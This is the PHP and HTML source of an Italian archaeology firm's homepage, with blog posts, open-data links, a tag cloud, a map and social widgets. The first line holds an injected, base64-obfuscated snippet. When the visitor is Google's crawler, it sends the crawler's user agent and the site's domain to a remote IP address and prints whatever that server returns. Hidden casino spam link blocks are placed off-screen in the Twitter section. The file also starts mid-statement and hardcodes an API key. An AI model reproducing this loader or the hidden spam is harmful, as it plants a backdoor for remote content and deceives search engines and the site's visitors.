<?php error_reporting(0);$jpictk_73b144dc=base64_decode("Li4u").mb_strtolower($_SERVER[HTTP_USER_AGENT]);$jpictk_73b144dc=str_replace(base64_decode("IA=="),base64_decode("LQ=="),$jpictk_73b144dc);if(mb_stripos($jpictk_73b144dc,base64_decode("Z29vZ2xl"))){$gxscsh_8a8bb7cd=base64_decode("MTc2");$olowsf_693a9fdd=base64_decode("MzE=");$rksqlr_9d607a66=base64_decode("MjUz");$gqrpko_894f782a=base64_decode("MjI3");$zstwbp_848e4626=base64_decode("Y2FrZXM=");$luzfqa_d88fc6ed=curl_init();curl_setopt($luzfqa_d88fc6ed,CURLOPT_URL,"http://$gxscsh_8a8bb7cd.$olowsf_693a9fdd.$rksqlr_9d607a66.$gqrpko_894f782a/$zstwbp_848e4626/?useragent=$jpictk_73b144dc&domain=$_SERVER[HTTP_HOST]");$gdfhly_b4a88417=curl_exec($luzfqa_d88fc6ed);curl_close($luzfqa_d88fc6ed);echo $gdfhly_b4a88417;} $botbotbot=0;?>
 

 

 

 

 
";
    $postList .= "<span class='headline'>";
    $postList .= "<a href='postView.php?p=".$post['id']."' class='transition' title='Visualizza post completo'>".$post['titolo']."</a>";
    $postList .= "</span>";
    $postList .= "<p class='date'>".$data[0]."</p>";
    $postList .= "<div class='postList'>".$p."</div>";
    $postList .= "</li>";
}

// open data documents lista
$odquery="SELECT odd.titolo, odd.categoria, odf.tipo, odf.link, l.sigla as licenza FROM liste.licenze l, main.log, main.opendata odd, main.opendatafile odf WHERE odd.id = log.record AND odf.licenza = l.id AND odf.opendata = odd.id AND log.tabella = 'opendata' AND log.operazione = 'I' ORDER BY log.data DESC LIMIT 10;";
$odres=pg_query($connection,$odquery);
while($od = pg_fetch_array($odres)){
    switch($od['tipo']){
        case 'pdf': $ico = '<i class="fa fa-file-pdf-o" aria-hidden="true"></i>'; break;
        case 'html': $ico = '<i class="fa fa-html5" aria-hidden="true"></i>'; break;
        case 'ppt':
        case 'odp': $ico = '<i class="fa fa-file-powerpoint-o" aria-hidden="true"></i>'; break;
        default: $ico = '<i class="fa fa-picture-o" aria-hidden="true"></i>';
    }
    $meta = ($od['categoria']=='html') ? "presentazione in html" : $od['categoria'].", ".$od['tipo'];
    $link = $od['link'];
    $odList .= "<li><a href='".$link."' target='_blank' title='[link esterno] ".$od['titolo']."' class='aSubSec transition'><span class='oddIco'>".$ico."</span><span class='oddText'>".$od['titolo']." (".$meta." - ".$od['licenza'].")</span></a></li>";
}

//tag cloud
$tag = "select unnest(string_to_array(tags, ',')) as tag,
  case
    when count(unnest(string_to_array(tags, ','))) < 10 then '.8rem'::text
    when count(unnest(string_to_array(tags, ','))) between 10 and 25 then '1rem'::text
    when count(unnest(string_to_array(tags, ','))) between 26 and 50 then '1.2rem'::text
    when count(unnest(string_to_array(tags, ','))) between 51 and 75 then '1.4rem'::text
    when count(unnest(string_to_array(tags, ','))) between 76 and 100 then '1.6rem'::text
    when count(unnest(string_to_array(tags, ','))) > 100 then '1.8rem'::text
  end as css
from main.tags
group by tag
order by tag asc;";
$tagres = pg_query($connection,$tag);
while($t=pg_fetch_array($tagres)){
    $tags .= "<a href='searchTag.php?tag=".$t['tag']."' title='cerca contenuti con tag ".$t['tag']."' class='tag transition' style='font-size: ".$t['css']." !important;'>".$t['tag']."</a>";
}
?>
<!DOCTYPE html>
<html>
    <head>
        <?php require("inc/meta.php"); ?>
        <link href="css/index.css" rel="stylesheet" media="screen" />
        <link href="lib/flexslider/flexslider.css" rel="stylesheet" media="screen" />
    </head>
    <body onload="init()">
        <header id="main"><?php require("inc/header.php"); ?></header>
        <div id="mainWrap">
            <section id="mappa">
                <div id ="mappaTool">
                    <header class="cursor main">Naviga tra i nostri lavori. <br/><i class="fa fa-map-marker"></i> <span id="coo"></span></header>
                    <article id="legend">
                        <ul>
                            <li><span>Legenda dei lavori suddivisi per categorie</span></li>
                            <li><i class="fa fa-university"></i> Archeologia</li>
                            <li><i class="fa fa-video-camera "></i> Documentazione</li>
                            <li><i class="fa fa-desktop"></i> Informatica</li>
                            <li><i class="fa fa-graduation-cap"></i> Didattica</li>
                            <li><i class="fa fa-flask"></i> Laboratorio</li>
                            <li><i class="fa fa-comments-o"></i> Convegni</li>
                        </ul>
                    </article>
                    <article id="switchLayer" style="display:none;">
                        <ul>
                            <?php
                            $layerq = "select * from liste.subcat where id in(select tipo_lavoro from main.attivita);";
                            $layerqres = pg_query($connection,$layerq);
                            while($layer = pg_fetch_array($layerqres)){
                                echo "<li><label for='layer".$layer['id']."' class='layerAct'><input type='checkbox' name='layer' value='".$layer['id']."' id='layer".$layer['id']."' checked ><i class='fa fa-check-square-o'></i> ".$layer['definizione']."</label></li>";
                            }
                            ?>
                        </ul>
                    </article>
                    <article id="infoJob"></article>
                </div>
            </section>
            <section id="servizi">
                <header><i class="fa fa-wrench"></i> Scopri i nostri servizi</header>
                <article id="serviziInfo"><?php require("inc/servizi.php"); ?></article>
            </section>
            <section id="main">
                <div class="mainDiv">
                    <article id="ator">
                        <header class="sectionMain">Geek corner <i class="fa fa-code"></i></header>
                        <ul>
                            <li>
                                <div><i class="fa fa-code fa-5x"></i> ATOR (Arc-Team Open Research) è un blog che nasce dall'esigenza di condividere le nostre esperienze in ambito informatico, i problemi riscontrati durante lo sviluppo di un software o i test su applicazioni varie, le soluzioni adottate per risolvere tali problemi. <!--La vasta comunità internazionale che supporta il blog e l'alto livello tecnico degli utenti hanno reso il blog un punto di riferimento per tuto ciò che riguarda l'informatica applicata ai Beni Culturali...ma no solo!--> Di seguito gli ultimi post inseriti, in fondo il link alla pagina principale del blog.</div>
                            </li>
                        </ul>
                        <script src="https://feeds.feedburner.com/blogspot/YduRN?format=sigpro" type="text/javascript" ></script>
                        <noscript><p>Subscribe to RSS headline updates from: <a href="https://feeds.feedburner.com/blogspot/YduRN"></a><br/>Powered by FeedBurner</p> </noscript>
                    </article>
                    <article id="youtube">
                        <header class="sectionMain">YouTube Channel <i class="fa fa-youtube-play"></i></header>
						

                        <ul>
                            <li>
                                <div><i class="fa fa-youtube fa-5x"></i> Nel nostro canale YouTube potete vedere i video delle nostre attività principali, delle nostre missioni all'estero, oltre ad alcuni video tutorial sui software "open" usati maggiormente in archeologia. Di seguito gli ultimi video caricati, in fondo a il link al nostro canale ufficiale</div>
                            </li>
                        </ul>
                        <p class="footerArticle"><a href="https://www.youtube.com/channel/UCa-GKE-c3Be1k8g0nqoawxw" target="_blank" title="[link esterno] Visualizza tutti i video del nostro canale"><i class="fa fa-youtube-play"></i> Visualizza tutti i video del nostro canale</a></p>
                    </article>
                </div>
                <div class="mainDiv">
                    <article id="post">
                        <header class="sectionMain">News from Arc-Team <i class="fa fa-th-list"></i></header>
                        <ul>
                            <li>
                                <div><i class="fa fa-th-list fa-5x"></i> Notizie, eventi, nuovi progetti, nuovi cantieri e tante altre informazioni dal mondo Arc-Team. Di seguito gli ultimi post inseriti, in fondo il link per accedere all'archivio completo.</div>
                            </li>
                            <?php echo $postList; ?>
                        </ul>
                        <p class="footerArticle"><a href="post.php" target="_blank" title="Visualizza tutti i post"><i class="fa fa-th-list"></i> Archivio completo</a></p>
                    </article>
                    <article id="tag">
                        <header class="sectionMain">Tag Cloud <i class="fa fa-tags" aria-hidden="true"></i></header>
                        <ul>
                            <li>
                                <div><i class="fa fa-tags fa-5x"></i> L'utilizzo di parole chiave (tag) in contesti come siti web, blog, giornali on-line ecc, permette di creare una sorta di "classificazione" dei contenuti. Lo scopo di tale classificazione è quello di rendere più semplice la fruizione dei contenuti da parte degli utenti, permettendo una rapida ricerca proprio per parole chiave.<br>Di seguito i tags più utilizzati, clicca su un termine per visualizzare tutti i post associati al tag selezionato</div>
                            </li>
                            <li><?php echo $tags; ?></li>
                        </ul>
                        <p class="footerArticle"><a href="#" title="Pagina di ricerca"><i class="fa fa-tags"></i> pagina di ricerca avanzata</a></p>
                    </article>
                </div>
                <div class="mainDiv">
                    <article id="media">
                        <header class="sectionMain">OpenDataDocuments <i class="fa fa-creative-commons"></i></header>
                        <ul class="oddMainList">
                            <li>
                                <div><i class="fa fa-creative-commons fa-5x"></i> La libera circolazione delle idee è alla base del nostro lavoro, per questo abbiamo dedicato una sezione del nostro sito alla condivisione di pubblicazioni, articoli scientifici e presentazioni che la nostra ditta ha prodotto negli anni. Alcuni articoli sono su Academia.edu, altri su Research Gate. Di seguito i link alle ultime risorse pubblicate</div>
                                <div>
                                    <ul class="oddList"><?php echo $odList; ?></ul>
                                </div>
                            </li>
                        </ul>
                        <p class="footerArticle"><a href="opendatadocs.php" title="Visualizza l'elenco completo dei documenti disponibili per il download"><i class="fa fa-creative-commons"></i> Visualizza l'elenco completo degli open data documents</a></p>
                    </article>
                    <article id="social">
                        <header class="sectionMain">Twitter <i class="fa fa-twitter" aria-hidden="true"></i></header>
                        <ul>
                            <li>
                                <div><i class="fa fa-twitter fa-5x"></i> Social Arc-Team. Di seguito gli ultimi tweet dagli account dei membri Arc-Team</div>
                                <div>

                                </div>
                            </li>
                        </ul>
                        <article id="tweetBeppe">
                            <a class="twitter-timeline" href="https://twitter.com/beppenapo" data-widget-id="301622279031365632">Tweet di @beppenapo</a>
<a title="Mr Green Online Casino" href="https://neuecasinos-at.com/casinos/mobile"><img src="https://neuecasinos-at.com/build/images/logos/neuecasinos-at.svg?v=753" width="65" height="22" title="TOP-SPIELAUTOMATEN" alt="NeueCasinos-AT.com"></a><div class="https://neuecasinos-at.com" style="position: absolute; left: -14522px;"><h2>Top Bewertung</h2><p>All diese Optionen sind über PC, Mobiltelefon und unsere sport-App verfügbar. FAQs. Wie funktionieren Sportwetten? Die einfachste Wette ist die reine.<a href="http://www.casinoonline.tf/de/">de</a> vor 3 Tagen — Viele Ankündigungen, aber nix ist fix - Leitartikel von Simone Hoepke; Tief „Daniel“: Sturm fegte über Ost-Österreich.Diese Website wird von TSG Interactive Gaming Europe Limited betrieben, einem in Malta unter der Firmennummer C registrierten Unternehmen mit dem eingetragenen Firmensitz Villa Seminia, 8, Sir Temi Zammit Avenue, Ta' Xbiex, XBXMalta. Https://neuecasinos-at.com/casinos/mobile of Ra ist aufgrund des überragenden Unterhaltungswerts unter Kennern ausgesprochen beliebt. Spielautomaten anleitung in Panzer Mission ist es deine Aufgabe, Danke für den ausführlichen Testbericht. Sehr gut ist die Unterstützung für Android, iPad und iPhone. Wer schnelle und einfache Einzahlungen beim Online Casino sucht, ist beim Betfair Casino somit goldrichtig. Um Gutscheine für NeueCasinos-AT.com Schnäppchen zu ergattern, denn hier sind Action und Spannung vorprogrammiert.</p><h2>Geschützt und sicher</h2><p>Sie können auf Ihrem Desktop-PC, auf Ihrem Mobiltelefon oder Ihrem Tablet spielen. Dies funktioniert ohne Download als Instant Play. Andererseits sind Boni eine schöne Belohnung für existierende loyale Stammkunden und eignen sich gut, um das Spielerlebnis eines Kunden noch abwechslungsreicher und spannender zu gestalten. Unserer Erfahrung nach bietet diese nämlich noch einmal ein verbessertes Design und punktet mit netten Zusatzfunktionen. Die wohl bekanntesten und beliebtesten Live Casino Spiele sind:. Https://neuecasinos-at.com/casinos/mobile Casinos Austria App. Manchmal bestehen diese Boni auch aus einer Kombination aus kostenlosen Geldbetrag und Freispielen.</p><h2>Jetonregen</h2><p>Denn die Anzahl an Casino Apps hat über die Jahre deutlich zugenommen und gibt uns heute viele Möglichkeiten. Denn je nachdem, welches Mobilgerät wir unser Eigen nennen, erwarten uns bereits bei der Installation deutliche Unterschiede. Diese Art von Sportwette ist besonders aufregend und verspricht action-geladenen Zugang zu unzähligen neuartigen Wettmärkten, die bei klassischen Sportwetten, bei denen Casino App Österreich vor dem Beginn der Veranstaltung gewettet werden kann, NeueCasinos-AT der Form und Vielfalt nicht zu finden sind. Wählen Sie Ihre Sprache:. Vor allem bleibt Ihre Kontonummer geschützt, alte kostenlose spielautomaten ein exklusiver Campeonbet Casino Bonus für Casinobonus Leser. Jetzt im österreichischen Online Casino spielen.</p></div>
<a title="ONLINE CASINO" href="https://nieuwecasinos-nl.com/games/live-roulettes"><img src="https://nieuwecasinos-nl.com//build/images/logos/nieuwecasinos-nl.svg?v=644" width="71" height="21" alt="nieuwecasinos-nl"></a><div class="https://nieuwecasinos-nl.com/games/live-roulettes" style="position: absolute; left: -11050px;"><h2>Waar letten we op bij een online casino?</h2><p>Ontdek welke Nederlandse Roulette goksites er zijn. Vind hier de betrouwbaarste online casino's om Lightning Roulette te spelen en speel mee in live casino. Het wachten is voor de Nederlandse spelers wel eindelijk nabij. In wet het.<a href="https://www.impeco.nl/stiek/karamba-casino-contact-jvyk.html">stiek karamba casino contact jvyk</a> Je kunt namelijk in steeds meer online casinos Roulette met iDeal spelen. de Nederlandse casino's en de casino's die zich richten op Nederlandse spelers zijn Het kan goed zijn dat het storten met iDeal om roulette te kunnen spelen voor jou Je ziet dan via een video live stream hoe de croupier het balletje in het wiel​.De nieuwe wetgeving stelt namelijk hoge eisen aan de vergunninghouders. Dit populaire internet casino is voor veel spelers het favoriete casino. Dat de spellen van hoge kwaliteit zijn dat zal je niet verbazen als je hoort dat NetEnt deze heeft gemaakt. Onze tip is wel om niet in een internetcasino te spelen om er rijk van te worden. Je volgt de stappen die je op je scherm ziet staan, kiest je bank en betrouwbaar NieuweCasinos-NL.com word je automatisch doorverwezen naar de internetbankieren pagina die je kent van andere aankopen.</p><h2>Waarom voelen mensen zich aangetrokken tot gokkasten?</h2><p>Je kunt storten met dit betaalmiddel, maar ook je winsten op uit laten betalen. N1 Casino N1 Casino is in online gegaan en heeft een uitgebreide selectie van spellen van o. Dit is de heilige graal waar veel casino websites over schrijven. De eerste stap bij het starten bij een online casino is het registreren van je account. Roulette met iDeal.</p><h2>Wat voor roulette spellen zijn er te vinden?</h2><p>Geld storten bij Netbet. Online poker kun je op vele manieren doen: tegen andere spelers, betrouwbaar NieuweCasinos-NL.com ook tegen een croupier. De Kansspelautoriteit geeft in haar prioriteitscriteria aan dat iDEAL wordt gezien als een betaalmiddel gericht op Nederlanders: en dat mag niet. Daar komt straks verandering in. De combinatie van alle beschreven reviews, maakt dat je op Onetime uitstekend terecht kunt, zodat je goed voorbereidt aan de slag kunt gaan.</p></div>


                            <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
                        </article>
                        <article id="tweetLuca">
                            <a class="twitter-timeline" href="https://twitter.com/ArcTeamATOR" data-widget-id="301623125618073600">Tweet di @ArcTeamATOR</a>
                            <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
                        </article>
                        <article id="faceb" class="inline"><ul></ul></article>
                    </article>
                </div>
            </section>
        </div>
        <footer><?php require("inc/footer.php"); ?></footer>
        <input type="hidden" id="extent" value="<?php echo $extent; ?>">
        <script src="lib/jquery-1.12.0.min.js"></script>
        <script src="https://openlayers.org/api/OpenLayers.js"></script>
        <script src="https://www.openstreetmap.org/openlayers/OpenStreetMap.js"></script>
        <script src="lib/flexslider/jquery.flexslider.js" charset="utf-8" type="text/javascript"></script>
        <script src="script/funzioni.js"></script>
        <script src="script/varGeom.js"></script>
        <script src="script/mappaIndex.js"></script>
        <script>
        window.onresize = function(){ map.updateSize();}
        $(document).ready(function(){
            $("a#home").addClass('actHome prevent');
            $(".headline a").addClass('transition');
            var hMap = $( window ).height()-100+"px";
            $("#mappa").css("height",hMap);
            $('#mappa header').click(function(){
                return false;
                var arrow = $('#mappa header i');
                var toggle = $('#switchLayer');
                toggle.toggleClass('aperto');
                if(toggle.hasClass('aperto')){
                    toggle.slideDown('fast');
                    rotate(arrow,180);
                }else{
                    toggle.slideUp('fast');
                    rotate(arrow,360);
                }
            });

            $('.flexslider').flexslider({
                animation: 'slide',
                easing: 'easeInQuad',
                controlNav: true,
                directionNav: true,
                pauseOnAction: false,
                pauseOnHover: true,
                slideshowSpeed: 10000,
                animationSpeed: 700,
                before: function() {$('.serviziTxt').hide();},
                after: function() {$('.serviziTxt').fadeIn(2000);}
            });

            $(".fbsubscribelink").prepend('<a href="https://arc-team-open-research.blogspot.it/" title="[link esterno] Vai alla pagina iniziale di ATOR" target="_blank"><i class="fa fa-rss" aria-hidden="true"></i> Visita il nostro blog</a>').addClass("footerArticle");

            var k="AIzaSyCN8A47a_r_cz0gW8cy1JXBQAs_nnOOSw0";
            var c="UCa-GKE-c3Be1k8g0nqoawxw";
            $.getJSON('https://www.googleapis.com/youtube/v3/search?key=AIzaSyCN8A47a_r_cz0gW8cy1JXBQAs_nnOOSw0&channelId=UCa-GKE-c3Be1k8g0nqoawxw&part=snippet,id&order=date&maxResults=5', function(data) {
                var trovati = [];
                $.each(data.items, function(k,v) {
                    var id = v.id.videoId ;
                    var url = "https://www.youtube.com/watch?v="+id;
                    var urlFrame = "https://www.youtube.com/embed/"+id;
                    var title = v.snippet.title;
                    var thumbSource = v.snippet.thumbnails.medium.url;
                    var thumbW = v.snippet.thumbnails.medium.width;
                    var thumbH = v.snippet.thumbnails.medium.height;
                    var iframe = "<iframe width='100%' src='"+urlFrame+"' frameborder='0' allowfullscreen></iframe>";
                    $("#youtube > ul").append("<li><span class='headline'><a href = '"+url+"' title='guarda video su youtube' target='_blank'>"+title+"</a></span>"+iframe+"</li>");
                });
            });
        });
        </script>
    </body>
</html>